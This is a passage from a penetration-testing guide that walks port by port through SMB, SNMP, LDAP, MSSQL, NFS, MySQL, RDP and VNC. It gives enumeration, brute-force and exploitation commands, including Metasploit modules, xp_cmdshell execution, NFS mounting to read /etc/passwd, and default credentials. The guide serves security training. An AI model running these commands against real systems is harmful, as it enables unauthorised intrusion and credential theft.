nmap -p 139,445 192.168.1.1/24
There are several NSE scripts that can be useful, for example:
ls -l /usr/share/nmap/scripts/smb*
-rw-r--r-- 1 root root 45K Jan 24 2016 /usr/share/nmap/scripts/smb-brute.nse
-rw-r--r-- 1 root root 4.8K Jan 24 2016 /usr/share/nmap/scripts/smb-enum-domains.nse
-rw-r--r-- 1 root root 5.8K Jan 24 2016 /usr/share/nmap/scripts/smb-enum-groups.nse
-rw-r--r-- 1 root root 7.9K Jan 24 2016 /usr/share/nmap/scripts/smb-enum-processes.nse
-rw-r--r-- 1 root root 12K Jan 24 2016 /usr/share/nmap/scripts/smb-enum-sessions.nse
-rw-r--r-- 1 root root 6.8K Jan 24 2016 /usr/share/nmap/scripts/smb-enum-shares.nse
-rw-r--r-- 1 root root 13K Jan 24 2016 /usr/share/nmap/scripts/smb-enum-users.nse
-rw-r--r-- 1 root root 1.7K Jan 24 2016 /usr/share/nmap/scripts/smb-flood.nse
95
Common ports\/services and how to use them
-rw-r--r-- 1 root root 7.3K Jan 24 2016 /usr/share/nmap/scripts/smb-ls.nse
-rw-r--r-- 1 root root 8.6K Jan 24 2016 /usr/share/nmap/scripts/smb-mbenum.nse
-rw-r--r-- 1 root root 7.0K Jan 24 2016 /usr/share/nmap/scripts/smb-os-discovery.nse
-rw-r--r-- 1 root root 5.0K Jan 24 2016 /usr/share/nmap/scripts/smb-print-text.nse
-rw-r--r-- 1 root root 63K Jan 24 2016 /usr/share/nmap/scripts/smb-psexec.nse
-rw-r--r-- 1 root root 5.0K Jan 24 2016 /usr/share/nmap/scripts/smb-security-mode.nse
-rw-r--r-- 1 root root 2.4K Jan 24 2016 /usr/share/nmap/scripts/smb-server-stats.nse
-rw-r--r-- 1 root root 14K Jan 24 2016 /usr/share/nmap/scripts/smb-system-info.nse
-rw-r--r-- 1 root root 1.5K Jan 24 2016 /usr/share/nmap/scripts/smbv2-enabled.nse
-rw-r--r-- 1 root root 7.5K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-conficker.nse
-rw-r--r-- 1 root root 6.5K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-cve2009-3103.nse
-rw-r--r-- 1 root root 6.5K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-ms06-025.nse
-rw-r--r-- 1 root root 5.4K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-ms07-029.nse
-rw-r--r-- 1 root root 5.7K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-ms08-067.nse
-rw-r--r-- 1 root root 5.5K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-ms10-054.nse
-rw-r--r-- 1 root root 7.2K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-ms10-061.nse
-rw-r--r-- 1 root root 4.5K Jan 24 2016 /usr/share/nmap/scripts/smb-vuln-regsvc-dos.nse
nmap -p 139,445 192.168.1.1/24 --script smb-enum-shares.nse smb-os-discovery.nse
nbtscan
nbtscan -r 192.168.1.1/24
It can be a bit buggy sometimes so run it several times to make sure it found all users.
Enum4linux
Enum4linux can be used to enumerate windows and linux machines with smb-shares.
The do all option:
enum4linux -a 192.168.1.120
For info about it ere: https://labs.portcullis.co.uk/tools/enum4linux/
rpcclient
You can also use rpcclient to enumerate the share.
Connect with a null-session. That is, without a user. This only works for older windows servers.
rpcclient -U "" 192.168.1.101
Once connected you could enter commands like
srvinfo
enumdomusers
getdompwinfo
querydominfo
netshareenum
netshareenumall
Port 143/993 - IMAP
96
Common ports\/services and how to use them
IMAP lets you access email stored on that server. So imagine that you are on a network at work, the
emails you recieve is not stored on your computer but on a specific mail-server. So every time you
look in your inbox your email-client (like outlook) fetches the emails from the mail-server using
imap.
IMAP is a lot like pop3. But with IMAP you can access your email from various devices. With pop3
you can only access them from one device.
Port 993 is the secure port for IMAP.
Port 161 and 162 - SNMP
Simple Network Management Protocol
SNMP protocols 1,2 and 2c does not encrypt its traffic. So it can be intercepted to steal credentials.
SNMP is used to manage devices on a network. It has some funny terminology. For example, instead
of using the word password the word community is used instead. But it is kind of the same thing. A
common community-string/password is public.
You can have read-only access to the snmp.Often just with the community string public.
Common community strings
public
private
community
Here is a longer list of common community strings:
https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/wordlist-common-snmp-
community-strings.txt
MIB - Management information base
SNMP stores all teh data in the Management Information Base. The MIB is a database that is
organized as a tree. Different branches contains different information. So one branch can be username
information, and another can be processes running. The "leaf" or the endpoint is the actual data. If
you have read-access to the database you can read through each endpoint in the tree. This can be used
with snmpwalk. It walks through the whole database tree and outputs the content.
snmpwalk
snmpwalk -c public -v1 192.168.1.101 #community string and which version
This command will output a lot of information. Way to much, and most of it will not be relevant to us
and much we won't understand really. So it is better to request the info that you are interested in. Here
are the locations of the stuff that we are interested in:
1.3.6.1.2.1.25.1.6.0 System Processes
1.3.6.1.2.1.25.4.2.1.2 Running Programs
1.3.6.1.2.1.25.4.2.1.4 Processes Path
1.3.6.1.2.1.25.2.3.1.4 Storage Units
1.3.6.1.2.1.25.6.3.1.2 Software Name
1.3.6.1.4.1.77.1.2.25 User Accounts
97
Common ports\/services and how to use them
1.3.6.1.2.1.6.13.1.3 TCP Local Ports
Now we can use this to query the data we really want.
snmpenum
snmp-check
This is a bit easier to use and with a lot prettier output.
snmp-check -t 192.168.1.101 -c public
Scan for open ports - Nmap
Since SNMP is using UDP we have to use the -sU flag.
nmap -iL ips.txt -p 161,162 -sU --open -vvv -oG snmp-nmap.txt
Onesixtyone
With onesixtyone you can test for open ports but also brute force community strings. I have had more
success using onesixtyone than using nmap. So better use both.
Metasploit
There are a few snmp modules in metasploit that you can use. snmp_enum can show you usernames,
services, and other stuff.
https://www.offensive-security.com/metasploit-unleashed/snmp-scan/
Port 199 - Smux
Port 389/636 - Ldap
Lightweight Directory Access Protocol. This port is usually used for Directories. Directory her means
more like a telephone-directory rather than a folder. Ldap directory can be understood a bit like the
windows registry. A database-tree. Ldap is sometimes used to store usersinformation. Ldap is used
more often in corporate structure. Webapplications can use ldap for authentication. If that is the case it
is possible to perform ldap-injections which are similar to sqlinjections.
You can sometimes access the ldap using a anonymous login, or with other words no session. This
can be useful becasue you might find some valuable data, about users.
ldapsearch -h 192.168.1.101 -p 389 -x -b "dc=mywebsite,dc=com"
When a client connects to the Ldap directory it can use it to query data, or add or remove.
Port 636 is used for SSL.
There are also metasploit modules for Windows 2000 SP4 and Windows Xp SP0/SP1
98
Common ports\/services and how to use them
Port 443 - HTTPS
Okay this is only here as a reminder to always check for SSL-vulnerabilities such as heartbleed. For
more on how to exploit web-applications check out the chapter on client-side vulnerabilities.
Heartbleed
OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable OpenSSL 1.0.1g is NOT vulnerable
OpenSSL 1.0.0 branch is NOT vulnerable OpenSSL 0.9.8 branch is NOT vulnerable
First we need to investigate if the https-page is vulnerable to heartbleed
We can do that the following way.
sudo sslscan 192.168.101.1:443
or using a nmap script
nmap -sV --script=ssl-heartbleed 192.168.101.8
You can exploit the vulnerability in many different ways. There is a module for it in burp suite, and
metasploit also has a module for it.
use auxiliary/scanner/ssl/openssl_heartbleed
set RHOSTS 192.168.101.8
set verbose true
run
Now you have a flow of random data, some of it might be of interest to you.
CRIME
Breach
Certificate
Read the certificate.
Does it include names that might be useful?
Correct vhost
Port 554 - RTSP
RTSP (Real Time Streaming Protocol) is a stateful protocol built on top of tcp usually used for
streaming images. Many commercial IP-cameras are running on this port. They often have a GUI
interface, so look out for that.
Port 587 - Submission
Outgoing smtp-port
If Postfix is run on it it could be vunerable to shellshock https://www.exploit-db.com/exploits/34896/
99
Common ports\/services and how to use them
Port 631 - Cups
Common UNIX Printing System has become the standard for sharing printers on a linux-network.
You will often see port 631 open in your priv-esc enumeration when you run netstat. You can log
in to it here: http://localhost:631/admin
You authenticate with the OS-users.
Find version. Test cups-config --version. If this does not work surf to http://localhost:631/printers
and see the CUPS version in the title bar of your browser.
There are vulnerabilities for it so check your searchsploit.
Port 993 - Imap Encrypted
The default port for the Imap-protocol.
Port 995 - POP3 Encrypten
Port 995 is the default port for the Post Office Protocol. The protocol is used for clients to connect to
the server and download their emails locally. You usually see this port open on mx-servers. Servers
that are meant to send and recieve email.
Related ports: 110 is the POP3 non-encrypted.
25, 465
Port 1025 - NFS or IIS
I have seen them open on windows machine. But nothing has been listening on it.
Port 1030/1032/1033/1038
I think these are used by the RPC within Windows Domains. I have found no use for them so far. But
they might indicate that the target is part of a Windows domain. Not sure though.
Port 1433 - MsSQL
Default port for Microsoft SQL .
sqsh -S 192.168.1.101 -U sa
Execute commands
# To execute the date command to the following after logging in
xp_cmdshell 'date'
go
Many o the scanning modules in metasploit requires authentication. But some do not.
100
Common ports\/services and how to use them
use auxiliary/scanner/mssql/mssql_ping
Brute force.
scanner/mssql/mssql_login
If you have credencials look in metasploit for other modules.
Port 1521 - Oracle database
Enumeration
tnscmd10g version -h 192.168.1.101
tnscmd10g status -h 192.168.1.101
Bruteforce the ISD
auxiliary/scanner/oracle/sid_brute
Connect to the database with sqlplus
References:
http://www.red-database-security.com/wp/itu2007.pdf
Ports 1748, 1754, 1808, 1809 - Oracle
These are also ports used by oracle on windows. They run Oracles Intelligent Agent.
Port 2049 - NFS
Network file system This is a service used so that people can access certain parts of a remote
filesystem. If this is badly configured it could mean that you grant excessive access to users.
If the service is on its default port you can run this command to see what the filesystem is sharing
showmount -e 192.168.1.109
Then you can mount the filesystem to your machine using the following command
mount 192.168.1.109:/ /tmp/NFS
mount -t 192.168.1.109:/ /tmp/NFS
Now we can go to /tmp/NFS and check out /etc/passwd, and add and remove files.
This can be used to escalate privileges if it is not correct configured. Check chapter on Linux
Privilege Escalation.
Port 2100 - Oracle XML DB
There are some exploits for this, so check it out. You can use the default Oracle users to access to it.
You can use the normal ftp protocol to access it.
101
Common ports\/services and how to use them
Can be accessed through ftp. Some default passwords here:
https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm Name: Version:
Default logins: sys:sys scott:tiger
Port 3268 - globalcatLdap
Port 3306 - MySQL
Always test the following:
Username: root
Password: root
mysql --host=192.168.1.101 -u root -p
mysql -h  -u root
mysql -h  -u root@localhost
mysql -h  -u ""@localhost
telnet 192.168.0.101 3306
You will most likely see this a lot:
ERROR 1130 (HY000): Host '192.168.0.101' is not allowed to connect to this MySQL server
This occurs because mysql is configured so that the root user is only allowed to log in from 127.0.0.1.
This is a reasonable security measure put up to protect the database.
Configuration files
cat /etc/my.cnf
http://www.cyberciti.biz/tips/how-do-i-enable-remote-access-to-mysql-database-server.html
Mysql-commands cheat sheet
http://cse.unl.edu/~sscott/ShowFiles/SQL/CheatSheet/SQLCheatSheet.html
Uploading a shell
You can also use mysql to upload a shell
Escalating privileges
If mysql is started as root you might have a chance to use it as a way to escalate your privileges.
MYSQL UDF INJECTION:
https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-
setuid-binaries/
Finding passwords to mysql
102
Common ports\/services and how to use them
You might gain access to a shell by uploading a reverse-shell. And then you need to escalate your
privilege. One way to do that is to look into the databse and see what users and passwords that are
available. Maybe someone is resuing a password?
So the first step is to find the login-credencials for the database. Those are usually found in some
configuration-file oon the web-server. For example, in joomla they are found in:
/var/www/html/configuration.php
In that file you find the
<?php
class JConfig {
var $mailfrom = 'PI:EMAIL';
var $fromname = 'testuser';
var $sendmail = '/usr/sbin/sendmail';
var $password = 'myPassowrd1234';
var $sitename = 'test';
var $MetaDesc = 'Joomla! - the dynamic portal engine and content management system'
var $MetaKeys = 'joomla, Joomla';
var $offline_message = 'This site is down for maintenance. Please check back again soon.'
}
Port 3339 - Oracle web interface
Port 3389 - Remote Desktop Protocol
This is a proprietary protocol developed by windows to allow remote desktop.
Log in like this
rdesktop -u guest -p guest 10.11.1.5 -g 94%
Brute force like this
ncrack -vv --user Administrator -P /root/passwords.txt rdp://192.168.1.101
Ms12-020
This is categorized by microsoft as a RCE vulnerability. But there is no POC for it online. You can
only DOS a machine using this exploit.
Port 4445 - Upnotifyp
I have not found anything here. Try connecting with netcat and visiting in browser.
Port 4555 - RSIP
I have seen this port being used by Apache James Remote Configuration.
There is an exploit for version 2.3.2
https://www.exploit-db.com/docs/40123.pdf
103
Common ports\/services and how to use them
Port 47001 - Windows Remote Management Service
Windows Remote Management Service
Port 5357 - WSDAPI
Port 5722 - DFSR
The Distributed File System Replication (DFSR) service is a state-based, multi-master file
replication engine that automatically copies updates to files and folders between computers that
are participating in a common replication group. DFSR was added in Windows Server 2003 R2.
I am not sure how what can be done with this port. But if it is open it is a sign that the machine in
question might be a Domain Controller.
Port 5900 - VNC
VNC is used to get a screen for a remote host. But some of them have some exploits.
You can use vncviewer to connect to a vnc-service. Vncviewer comes built-in in Kali.
It defaults to port 5900. You do not have to set a username. VNC is run as a specific user, so when
you use VNC it assumes that user. Also note that the password is not the user password on the
machine. If you have dumped and cracked the user password on a machine does not mean you can
use them to log in. To find the VNC password you can use the metasploit/meterpreter post exploit
module that dumps VNC passwords
background
use post/windows/gather/credentials/vnc
set session X
exploit
vncviewer 192.168.1.109
Ctr-alt-del
If you are unable to input ctr-alt-del (kali might interpret it as input for kali).
Try shift-ctr-alt-del
Metasploit scanner
You can scan VNC for logins, with bruteforce.
Login scan
use auxiliary/scanner/vnc/vnc_login
set rhosts 192.168.1.109
run
Scan for no-auth
use auxiliary/scanner/vnc/vnc_none_auth
104
Common ports\/services and how to use them
set rhosts 192.168.1.109
run
Port 8080
Since this port is used by many different services. They are divided like this.
Tomcat
Tomcat suffers from default passwords. There is even a module in metasploit that enumerates
common tomcat passwords. And another module for exploiting it and giving you a shell.
Port 9389 -
Active Directory Administrative Center is installed by default on Windows Server 2008 R2 and
is available on Windows 7 when you install the Remote Server Administration Tools (RSAT).
105
Port Knocking
Port Knocking
Port knocking
Port-knocking the a obfuscation-as-security technique. It basically means that after knocking on ports
in a specific sequence a certain port will open automatically. It seems to be more popular in Capture-
the-flag contests than real life networks. But I have included it anyways, since CTF:s are great.
This is a way to hide certain ports, so you don't get unwanted intrusion-intents.
So for example, imagine you access your server through ssh. But you are tired of getting unwanted
bruteforce attempts all day long. You can just have the SSH-port closed and when you knock on